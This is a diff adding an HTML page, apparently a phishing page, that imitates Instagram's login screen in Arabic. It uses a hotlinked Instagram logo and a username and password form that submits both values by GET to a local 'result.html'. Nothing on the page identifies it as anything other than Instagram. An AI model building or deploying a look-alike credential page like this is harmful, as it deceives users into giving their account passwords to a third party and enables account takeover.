@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            width: 350px;
+            padding: 40px 30px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+        img {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 7px 0;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            border-radius: 3px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            opacity: 0.9;
+        }
+        .or {
+            margin: 15px 0;
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+        .or:before, .or:after {
+            content: "";
+            display: inline-block;
+            width: 35%;
+            height: 1px;
+            background: #dbdbdb;
+            vertical-align: middle;
+            margin: 0 5px;
+        }
+        .footer {
+            margin-top: 15px;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+    <form class="container" action="result.html" method="GET">
+        <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Logo">
+
+        <input type="text" name="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+
+        <input type="password" name="password" placeholder="كلمة المرور" required>
+
+        <button type="submit">تسجيل الدخول</button>
+
+        <div class="or">أو</div>
+
+        <div class="footer">
+            نسيت كلمة المرور؟
+        </div>
+    </form>
+
+</body>
+</html>
